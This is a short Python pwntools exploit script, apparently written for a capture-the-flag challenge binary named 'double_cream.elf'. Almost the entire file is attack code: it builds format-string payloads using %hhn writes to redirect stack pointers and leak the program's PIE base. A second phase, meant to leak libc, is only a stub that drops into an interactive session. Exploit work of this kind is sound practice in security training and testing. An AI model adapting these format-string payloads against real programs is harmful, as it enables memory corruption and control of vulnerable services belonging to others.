from pwn import *

# 1: pointer to data
# 8:  pointer stack -> 12
# 10: pointer stack -> 16 
# 12: pointer stack -> ...
# 16: pointer -> prog base (scratch)

off_fsb = 0x9e6
off_inp2 = 0x201460
got_puts = 0x200Fb0

def fmt_writes(*writing):
    cur_val = 0
    fmt = ''
    for off, val in writing:
        fmt += '%{}c%{}$hhn'.format((val - cur_val) & 0xff, off)
        cur_val = val
    return fmt

def attempt(p):

    # Phase 1: Leak PIE
    p.recvuntil('input 1: ')
    p.sendline(fmt_writes((8, 0x08)) + '|%1$p|%6$p|')

    p.recvuntil('input 2: ')
    raw_input()
    p.sendline(fmt_writes((12, off_fsb & 0xff)))

    p.recvuntil('|0x')
    leak = int(p.recvuntil('|0x', drop=True), 16)
    leak2 = int(p.recvuntil('|', drop=True), 16)
    prog_base = leak - off_inp2
    assert (leak2 & 0xff) == 0x20

    log.info('Leaked program base: {:016x}'.format(prog_base))
    log.info('Leak2: {:016x}'.format(leak2))

    # Phase 2: Leak libc

    p.interactive()

if __name__ == '__main__':
    p = process('./double_cream.elf', aslr=False)
    attempt(p)
